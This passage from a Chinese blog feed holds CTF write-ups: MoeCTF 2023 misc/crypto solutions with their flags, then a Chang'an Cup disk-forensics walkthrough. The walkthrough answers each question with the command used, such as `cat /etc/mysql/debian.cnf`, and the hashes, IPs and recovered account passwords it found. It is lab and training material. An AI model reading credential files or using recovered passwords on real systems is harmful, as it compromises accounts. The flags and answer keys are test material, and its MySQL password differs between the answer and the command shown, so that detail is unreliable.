class="hljs-symbol">nt_role_in_intern@</span><span class="hljs-symbol">tion@</span><span class="hljs-symbol">liz@</span>tion_g92WPIB&#125;<br></code></pre></td></tr></table></figure><h3 id="狗子-2-照片"><a href="#狗子-2-照片" class="headerlink" title="狗子(2) 照片"></a><strong>狗子(2) 照片</strong></h3><p>​    用zsteg跑lsb，得flag</p><p>Flag：moectf{D0ggy_H1dd3n_1n_Pho7o_With_LSB!}</p><h3 id="base乐队"><a href="#base乐队" class="headerlink" title="base乐队"></a><strong>base乐队</strong></h3><p>​    依次用base32、base58、base32解密得到</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">bYeNQXYZXbXZQfW31FGzzD0m0FHQ9RR85FFQYMB9M</span><span class="hljs-operator">=</span>lmo2ku11z0uiz<span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>发现中间有=，目前已知出现=均是在字符串尾部，猜测通过某种加密将=放在了中间，尝试暴力栅栏，得到flag</p><p>flag：moectf{Th4_6@nd_1nc1ud45_F3nc4_@nd_b@s3}</p><h3 id="奇怪的压缩包"><a href="#奇怪的压缩包" class="headerlink" title="奇怪的压缩包"></a><strong>奇怪的压缩包</strong></h3><p>​    压缩包打开，发现有个文件夹为ppt，根据题目描述，改后缀，成功得到ppt文件，通过改字体颜色、遮挡、批注、解压ppt文档隐藏</p><p>Flag：moectf{2ip123456_?_ n0_i4_pp4x!}</p><h3 id="机位查询"><a href="#机位查询" class="headerlink" title="机位查询"></a><strong>机位查询</strong></h3><p>   三张图片的地点均在广西南宁，分别是南宁站、中山路美食街、华润大厦，查卫星地图可分析得到前两张图片拍摄地点为嘉士摩根国际、百盛步行街广场，最后一张始终分析不出拍摄的地点，仔细查看，发现有exif信息，有gps定位，查询，找到汇金宛，</p><img src="/2024/04/29/moectf2023/clip_image030.png" class title="img"><p>Flag：moectf{jiashi_baisheng_huijin}</p><h3 id="狗子-3-寝室"><a href="#狗子-3-寝室" class="headerlink" title="狗子(3) 寝室"></a><strong>狗子(3) 寝室</strong></h3><p>​     编写压缩包解压脚本或工具解压，得到flag.txt</p><p>Flag: moectf{Ca7_s133p1ng_und3r_zip_5hell5}</p><h3 id="尊嘟假嘟？"><a href="#尊嘟假嘟？" class="headerlink" title="尊嘟假嘟？"></a><strong>尊嘟假嘟？</strong></h3><p>​     根据hint1涉及到base58，尝试base58解密</p><img src="/2024/04/29/moectf2023/clip_image032.png" class title="img"><p>一堆乱码，而hint2提示为bl<strong>*</strong>sh加密，想到blowfish，将key和iv求出，带入解密，得到一个可疑字符串</p><img src="/2024/04/29/moectf2023/clip_image034.png" class title="img"><p>再进行base64解密，得到flag</p><img src="/2024/04/29/moectf2023/clip_image036.png" class title="img">]]></content>
    
    
    <categories>
      
      <category>CTF WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto Misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第四届长安杯取证复现</title>
    <link href="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/"/>
    <url>/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/</url>
    
    <content type="html"><![CDATA[<p><a href="https://pan.baidu.com/s/1JWxtyhzmjZksAos2QUaWcw?pwd=wvk4">下载</a>好附件，VeraCrypt密码：2022.4th.changancup!</p><p><a href="https://www.forensics-wiki.com/base/veracrypt/">使用VeraCrypt挂在VC容器</a></p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240408142228909.png" class title="image-20240408142228909"><p>我选择是在Z盘，加载成功后多出一个Z盘，打开得到</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240408142312925.png" class title="image-20240408142312925"><h2 id="1-检材1的SHA256值为？"><a href="#1-检材1的SHA256值为？" class="headerlink" title="1.检材1的SHA256值为？"></a>1.检材1的SHA256值为？</h2><p>用X-ways计算sha265,直接拖入—&gt;工具—&gt;计算哈希，选择sha256即可，注意这里的sha256问的是原始硬盘的哈希值，而非.e01文件的哈希值</p><p>错误答案</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240408170254927.png" class title="image-20240408170254927"><p>正确答案</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240408170425738.png" class title="image-20240408170425738"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">9E48BB2CAE5C1D93BAF572E3646D2ECD26080B70413DC7DC4131F88289F49E34<br></code></pre></td></tr></table></figure><h2 id="2-分析检材1，搭建该服务器的技术员IP地址是多少？用该地址解压检材2"><a href="#2-分析检材1，搭建该服务器的技术员IP地址是多少？用该地址解压检材2" class="headerlink" title="2.分析检材1，搭建该服务器的技术员IP地址是多少？用该地址解压检材2"></a>2.分析检材1，搭建该服务器的技术员IP地址是多少？用该地址解压检材2</h2><p>仿真后选择第二个选项进入，root账户为弱密码123456，执行last命令，得到ip（这里如果仿真失败，<a href="https://www.cnblogs.com/dfir/p/16353508.html#6%E7%A3%81%E7%9B%98%E8%A2%AB%E5%8D%A0%E7%94%A8%E9%97%AE%E9%A2%98">参考</a>），如果还是不行，就更换<a href="https://www.52pojie.cn/thread-1698481-1-1.html">FTK</a>版本。这里我测试3.3的比较好用</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240408234736568.png" class title="image-20240408234736568"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">172.16.80.100<br></code></pre></td></tr></table></figure><h2 id="3-检材1中，操作系统发行版本号为"><a href="#3-检材1中，操作系统发行版本号为" class="headerlink" title="3.检材1中，操作系统发行版本号为"></a>3.检材1中，操作系统发行版本号为</h2><p>执行命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /etc/*-release<br></code></pre></td></tr></table></figure><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240408235019922.png" class title="image-20240408235019922"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">CentOS 7.5.1804<br></code></pre></td></tr></table></figure><h2 id="4-检材1系统中，网卡绑定的静态IP地址为"><a href="#4-检材1系统中，网卡绑定的静态IP地址为" class="headerlink" title="4.检材1系统中，网卡绑定的静态IP地址为"></a>4.检材1系统中，网卡绑定的静态IP地址为</h2><p>执行命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ifconfig<br></code></pre></td></tr></table></figure><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240408235220717.png" class title="image-20240408235220717"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">172.16.80.133<br></code></pre></td></tr></table></figure><h2 id="5-检材1中，网站jar包所存放的目录是-答案为绝对路径，如“-home-honglian-”"><a href="#5-检材1中，网站jar包所存放的目录是-答案为绝对路径，如“-home-honglian-”" class="headerlink" title="5.检材1中，网站jar包所存放的目录是(答案为绝对路径，如“/home/honglian/”)"></a>5.检材1中，网站jar包所存放的目录是(答案为绝对路径，如“/home/honglian/”)</h2><p>这里可以执行history命令查看历史命令，在/web/app目录下有多次操作，可以在该目录下发现大量jar包，或者执行find命令查找</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -name *.jar<br></code></pre></td></tr></table></figure><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240408235338821.png" class title="image-20240408235338821"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">/web/app/<br></code></pre></td></tr></table></figure><h2 id="6-检材1中，监听7000端口的进程对应文件名为"><a href="#6-检材1中，监听7000端口的进程对应文件名为" class="headerlink" title="6.检材1中，监听7000端口的进程对应文件名为"></a>6.检材1中，监听7000端口的进程对应文件名为</h2><p>解压缩，在cloud.jar的BOOT-INF\classes\application.properties发现7000端口</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240409110206022.png" class title="image-20240409110206022"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">application.properties<br></code></pre></td></tr></table></figure><h2 id="7-检材1中，网站管理后台页面对应的网络端口为（答案填写阿拉伯数字，如“100”）"><a href="#7-检材1中，网站管理后台页面对应的网络端口为（答案填写阿拉伯数字，如“100”）" class="headerlink" title="7.检材1中，网站管理后台页面对应的网络端口为（答案填写阿拉伯数字，如“100”）"></a>7.检材1中，网站管理后台页面对应的网络端口为（答案填写阿拉伯数字，如“100”）</h2><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240409113321599.png" class title="image-20240409113321599"><p>可以看到在/web/app/admin下多次执行npm run dev命令，故在该目录下复现操作</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240409113449452.png" class title="image-20240409113449452"><p>登录0.0.0.0:9090，发现是网站后台</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240410202347637.png" class title="image-20240410202347637"><p>故网址端口为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">9090<br></code></pre></td></tr></table></figure><h2 id="8-检材1中，网站前台页面里给出的APK的下载地址是（答案格式如下：“https-www-forensix-cn-abc-def”"><a href="#8-检材1中，网站前台页面里给出的APK的下载地址是（答案格式如下：“https-www-forensix-cn-abc-def”" class="headerlink" title="8.检材1中，网站前台页面里给出的APK的下载地址是（答案格式如下：“https://www.forensix.cn/abc/def”)"></a>8.检材1中，网站前台页面里给出的APK的下载地址是（答案格式如下：“<a href="https://www.forensix.cn/abc/def”">https://www.forensix.cn/abc/def”</a>)</h2><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240409124341670.png" class title="image-20240409124341670"><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240410203832688.png" class title="image-20240410203832688"><p>查看日志，发现可疑端口3000，猜测是网址前台，根据历史命令，尝试搭建</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240409124806458.png" class title="image-20240409124806458"><p>扫码复制链接得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">https://pan.forensix.cn/f/c45ca511c7f2469090ad/?dl=1<br></code></pre></td></tr></table></figure><h2 id="9-检材1中，网站管理后台页面调用的用户表-admin-里的密码字段加密方式为"><a href="#9-检材1中，网站管理后台页面调用的用户表-admin-里的密码字段加密方式为" class="headerlink" title="9.检材1中，网站管理后台页面调用的用户表(admin)里的密码字段加密方式为?"></a>9.检材1中，网站管理后台页面调用的用户表(admin)里的密码字段加密方式为?</h2><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240409125332761.png" class title="image-20240409125332761"><p>尝试登录发现url为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://172.16.80.133:6010/admin/system/employee/googleAuth/sign/in<br></code></pre></td></tr></table></figure><p>在admin-api.jar里查找</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240409130211737.png" class title="image-20240409130211737"><p>加密方法是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">md5<br></code></pre></td></tr></table></figure><h2 id="10-分析检材1，网站管理后台登录密码加密算法中所使用的盐值是"><a href="#10-分析检材1，网站管理后台登录密码加密算法中所使用的盐值是" class="headerlink" title="10. 分析检材1，网站管理后台登录密码加密算法中所使用的盐值是"></a><strong>10.</strong> 分析检材1，网站管理后台登录密码加密算法中所使用的盐值是</h2><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240410202041387.png" class title="image-20240410202041387"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">XehGyeyrVgOV4P8Uf70REVpIw3iVNwNs<br></code></pre></td></tr></table></figure><h2 id="11-检材2中，windows账户Web-King的登录密码是"><a href="#11-检材2中，windows账户Web-King的登录密码是" class="headerlink" title="11.检材2中，windows账户Web King的登录密码是"></a>11.检材2中，windows账户Web King的登录密码是</h2><p>火眼得到密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">135790<br></code></pre></td></tr></table></figure><h2 id="12-检材2中，除检材1以外，还远程连接过哪个IP地址？并用该地址解压检材3"><a href="#12-检材2中，除检材1以外，还远程连接过哪个IP地址？并用该地址解压检材3" class="headerlink" title="12.检材2中，除检材1以外，还远程连接过哪个IP地址？并用该地址解压检材3"></a>12.检材2中，除检材1以外，还远程连接过哪个IP地址？并用该地址解压检材3</h2><p>仿真后xshell要更新，无法使用，打开其安装目录，在Users/Web King/Documents/NetSarang Computer/7/Xshell/Sessions得到</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412115713352.png" class title="image-20240412115713352"><p>答案为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">172.16.80.128<br></code></pre></td></tr></table></figure><h2 id="13-检材2中，powershell中输入的最后一条命令是"><a href="#13-检材2中，powershell中输入的最后一条命令是" class="headerlink" title="13.检材2中，powershell中输入的最后一条命令是"></a>13.检材2中，powershell中输入的最后一条命令是</h2><p>打开powershell，按↑得到，或者使用命令Get-History | Format-List -Property *</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412120041769.png" class title="image-20240412120041769"><p>答案：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ipconfig<br></code></pre></td></tr></table></figure><h2 id="14-检材2中，下载的涉案网站源代码文件名为"><a href="#14-检材2中，下载的涉案网站源代码文件名为" class="headerlink" title="14.检材2中，下载的涉案网站源代码文件名为"></a>14.检材2中，下载的涉案网站源代码文件名为</h2><p>在检材1的网站里，可以发现网站名字，打开下载目录</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412121034133.png" class title="image-20240412121034133"><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412121156972.png" class title="image-20240412121156972"><p>所以答案为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">ZTuoExchange_framework-master.zip<br></code></pre></td></tr></table></figure><h2 id="15-检材2中，网站管理后台root账号的密码为"><a href="#15-检材2中，网站管理后台root账号的密码为" class="headerlink" title="15.检材2中，网站管理后台root账号的密码为"></a>15.检材2中，网站管理后台root账号的密码为</h2><p>打开浏览器查看浏览器储存的密码</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412121402793.png" class title="image-20240412121402793"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">root<br></code></pre></td></tr></table></figure><h2 id="16-检材2中，技术员使用的WSL子系统发行版本是（答案格式如下：windows-10-1）"><a href="#16-检材2中，技术员使用的WSL子系统发行版本是（答案格式如下：windows-10-1）" class="headerlink" title="16.检材2中，技术员使用的WSL子系统发行版本是（答案格式如下：windows 10.1）"></a>16.检材2中，技术员使用的WSL子系统发行版本是（答案格式如下：windows 10.1）</h2><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412121540956.png" class title="image-20240412121540956"><p>在搜索栏搜索常见的wsl，这里有2个，运行只有20的可以，或者执行命令wsl —list –verbose</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412121717638.png" class title="image-20240412121717638"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">ubuntu 20.04<br></code></pre></td></tr></table></figure><h2 id="17-检材2中，运行的数据库服务版本号是（答案格式如下：10-1）"><a href="#17-检材2中，运行的数据库服务版本号是（答案格式如下：10-1）" class="headerlink" title="17.检材2中，运行的数据库服务版本号是（答案格式如下：10.1）"></a>17.检材2中，运行的数据库服务版本号是（答案格式如下：10.1）</h2><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412121835144.png" class title="image-20240412121835144"><p>进入WSL,执行mysql -V</p><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">mysql 8.0.30<br></code></pre></td></tr></table></figure><h2 id="18-上述数据库debian-sys-maint用户的初始密码是"><a href="#18-上述数据库debian-sys-maint用户的初始密码是" class="headerlink" title="18.上述数据库debian-sys-maint用户的初始密码是"></a>18.上述数据库debian-sys-maint用户的初始密码是</h2><p>执行 cat /etc/mysql/debian.cnf得到</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412123700724.png" class title="image-20240412123700724"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">ZdQfi7vaXjHZs75M<br></code></pre></td></tr></table></figure><h2 id="19-检材3服务器root账号的密码是"><a href="#19-检材3服务器root账号的密码是" class="headerlink" title="19.检材3服务器root账号的密码是"></a>19.检材3服务器root账号的密码是</h2><p>执行history命令，发现用root账户连接了172.16.80.128</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412124154091.png" class title="image-20240412124154091"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">h123456<br></code></pre></td></tr></table></figure><h2 id="20-检材3中，监听33050端口的程序名（program-name）为"><a href="#20-检材3中，监听33050端口的程序名（program-name）为" class="headerlink" title="20.检材3中，监听33050端口的程序名（program name）为"></a>20.检材3中，监听33050端口的程序名（program name）为</h2><p>仿真后xshel连接，使用history命令，发现在data/mysql下启动了docker</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412193052083.png" class title="image-20240412193052083"><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412192804081.png" class title="image-20240412192804081"><p>查看有关文件，发现端口33050，在/data/mysql/下启动docker,同时这里也有22和23题的答案</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412182338221.png" class title="image-20240412182338221"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">docker-proxy<br></code></pre></td></tr></table></figure><h2 id="21-除MySQL外，该网站还依赖以下哪种数据库"><a href="#21-除MySQL外，该网站还依赖以下哪种数据库" class="headerlink" title="21.除MySQL外，该网站还依赖以下哪种数据库"></a>21.除MySQL外，该网站还依赖以下哪种数据库</h2><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412193418866.png" class title="image-20240412193418866"><p>查看历史命令，发现还启动了nohup了redis和mongo</p><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">redis和mongo<br></code></pre></td></tr></table></figure><h2 id="22-检材3中，MySQL数据库root账号的密码是"><a href="#22-检材3中，MySQL数据库root账号的密码是" class="headerlink" title="22.检材3中，MySQL数据库root账号的密码是"></a>22.检材3中，MySQL数据库root账号的密码是</h2><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412193851285.png" class title="image-20240412193851285"><p>在20题的docker文件中可以发现密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">sshl7701<br></code></pre></td></tr></table></figure><h2 id="23-检材3中，MySQL数据库在容器内部的数据目录为"><a href="#23-检材3中，MySQL数据库在容器内部的数据目录为" class="headerlink" title="23.检材3中，MySQL数据库在容器内部的数据目录为"></a>23.检材3中，MySQL数据库在容器内部的数据目录为</h2><p>在20题的docker文件中可以发现数据库文件在/var/lib/mysql</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412194050132.png" class title="image-20240412194050132"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">/var/lib/mysql<br></code></pre></td></tr></table></figure><h2 id="24-涉案网站调用的MySQL数据库名为"><a href="#24-涉案网站调用的MySQL数据库名为" class="headerlink" title="24.涉案网站调用的MySQL数据库名为"></a>24.涉案网站调用的MySQL数据库名为</h2><p>在检材1的admin-api.jar里发现</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412201755416.png" class title="image-20240412201755416"><p>以及检材3的data/mysql/db/8eda4cb0b452.log可以发现</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412202037242.png" class title="image-20240412202037242"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">b1<br></code></pre></td></tr></table></figure><h2 id="25-勒索者在数据库中修改了多少个用户的手机号？-答案填写阿拉伯数字，如“15”"><a href="#25-勒索者在数据库中修改了多少个用户的手机号？-答案填写阿拉伯数字，如“15”" class="headerlink" title="25.勒索者在数据库中修改了多少个用户的手机号？(答案填写阿拉伯数字，如“15”)"></a>25.勒索者在数据库中修改了多少个用户的手机号？(答案填写阿拉伯数字，如“15”)</h2><p>在data/mysql/db下，查看8eda4cb0b452.log，搜索UOPDATE,发现有3个命令修改手机号</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412201328928.png" class title="image-20240412201328928"><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412201606706.png" class title="image-20240412201606706"><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412201356495.png" class title="image-20240412201356495"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">3<br></code></pre></td></tr></table></figure><h2 id="26-勒索者在数据库中删除的用户数量为-答案填写阿拉伯数字，如“15”"><a href="#26-勒索者在数据库中删除的用户数量为-答案填写阿拉伯数字，如“15”" class="headerlink" title="26.勒索者在数据库中删除的用户数量为(答案填写阿拉伯数字，如“15”)"></a>26.勒索者在数据库中删除的用户数量为(答案填写阿拉伯数字，如“15”)</h2><p>还是上面那个文件，搜索DELETE,从973—1000</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412202247958.png" class title="image-20240412202247958"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">28<br></code></pre></td></tr></table></figure><h2 id="27-还原被破坏的数据库，分析除技术员以外，还有哪个IP地址登录过管理后台网站？用该地址解压检材4"><a href="#27-还原被破坏的数据库，分析除技术员以外，还有哪个IP地址登录过管理后台网站？用该地址解压检材4" class="headerlink" title="27.还原被破坏的数据库，分析除技术员以外，还有哪个IP地址登录过管理后台网站？用该地址解压检材4"></a>27.还原被破坏的数据库，分析除技术员以外，还有哪个IP地址登录过管理后台网站？用该地址解压检材4</h2><p>在检材2的D盘发现了搭建网站的数据库文件b1和其他一些文件</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412203530045.png" class title="image-20240412203530045"><p>这里将检材2里D盘发现的b1数据库恢复到/data/mysql/db,启动数据库，查看数据库</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413161057221.png" class title="image-20240413161057221"><p>使用的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl start docker<br>docker exec -it 8eda /bin/bash<br>mysql -u root -pshhl7001<br></code></pre></td></tr></table></figure><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413161919911.png" class title="image-20240413161919911"><p>连接数据库，发现有两个ip,100为检材2的ip（技术员ip）,197的就为所求ip</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412225905572.png" class title="image-20240412225905572"><p>这里也可以看日志，搜索172.16.80，发现admin登录只有100和197的ip。</p><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">172.16.80.197<br></code></pre></td></tr></table></figure><h2 